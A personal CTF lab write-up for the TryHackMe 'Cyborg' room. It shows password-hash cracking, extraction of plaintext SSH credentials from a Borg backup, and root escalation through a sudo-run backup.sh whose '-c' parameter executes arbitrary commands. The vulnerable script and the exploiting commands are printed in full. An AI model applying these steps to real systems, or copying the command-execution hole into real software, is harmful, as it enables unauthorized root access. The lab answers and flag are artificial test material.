# [[THM - Cyborg]]  


# Resolution summary
- Exploited Borg Repo that contained the user Alex's password written in a text file
- Used `sudo -l` found that our user can run `/etc/mp3backups/backup.sh`
- `backup.sh` was readable and showed it ran anything given as a `c` parameter in a CMD root user terminal

## Improved skills
- Need to not zone into one area and explore all avenues
- IF SOMTHING ISNT WORKING IT MIGHT BE BECAUSE ITS NOT GOING TO AND NOT BECAUSE YOU ARENT DOING IT RIGHT!!!!!!

## Used tools
- [[nmap]]
- [[Borg]]
- [[SSH]]

# Enumeration
## Port 80
- /admin
	- Leads to a site where two admins talk about using squid proxy and having configs still stored on the site somewhere
	- We also find a **.tar** file under music section
		- Downloading and opening shows that we have a [[Borg]] repo based on the README file
		- So this must be what the creds we found under
- /etc
	- Searching Squid proxy shows that it usually stores info in this subdomain so trying it leads us to a password file of: `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
		- Cracking that password using [[Hash-Identifier]] shows its a MD5(APR)
		- Putting this into hashcat against the rockyou dictionary reveals the password:
			- `music_archive:squidward`

# Exploitation
## Password Saved In Borg Repo
- Using Borg we installed it to our system and used the following command to access it:
```bash
borg extract home/field/dev/final_archive/::music_archive
```
- The `home/field/dev/final_archive/` came from the **.tar** file it contained folders with this structure
- The `music_archive` came from our **/etc** subdomain and we are prompted for a password which we cracked earlier!!!

- Doing this will extract a new path for the user Alex: `/home/alex`
- Searching his folders under `Documents/note.txt` :
```text
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

## SSH Creds
**alex:S3cretP@s3**

## backup.sh Running as Admin??
```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/a$

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```
- This is taking a parameter of `c` and passing that through to a **CMD** testing it with:
```bash
sudo /etc/mp3backups/backup.sh -c whoami
```
- Returned: `root`!!! We have access to root commands could open a shell with root user but just located a root.txt under `/root`
```bash
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c 'cat /root/root.txt'
```
- flag{Than5s_f0r_play1ng_H0pÂ£_y0u_enJ053d}
